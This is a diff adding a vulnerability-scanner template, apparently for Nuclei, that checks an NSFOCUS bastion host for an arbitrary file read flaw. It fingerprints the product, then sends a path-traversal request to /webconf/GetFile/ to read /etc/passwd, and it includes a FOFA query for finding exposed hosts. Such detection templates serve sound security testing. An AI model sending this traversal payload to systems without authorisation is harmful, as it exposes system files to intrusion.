@@ -1,0 +1,45 @@
+id: nsfocus-lfi
+
+info:
+  name: Nsfocus - Arbitrary File Read
+  author: ritikchaddha
+  severity: high
+  description: |
+    Nsfocus bastion has an Arbitrary File Read Vulnerability through '/webconf/GetFile/'.
+  reference:
+    - https://forum.butian.net/article/250
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query: body="'/needUsbkey.php?username='"
+  tags: nsfocus,lfi
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /user/requireLogin HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(tolower(body), 'nsfocus')"
+          - "status_code == 200"
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        GET /webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "regex('root:.*:0:0:', body)"
+          - "status_code == 200"
+        condition: and
+# digest: 490a00463044022002d9652face68897b32730cc72e9fe04a37f6e91ba7166c7430859476b264b76022075b4c0a97653c0a9e7518833ec83c935804b209a5f41ce26aed1ca42491d5b35:922c64590222798bb761d5b6d8e72950
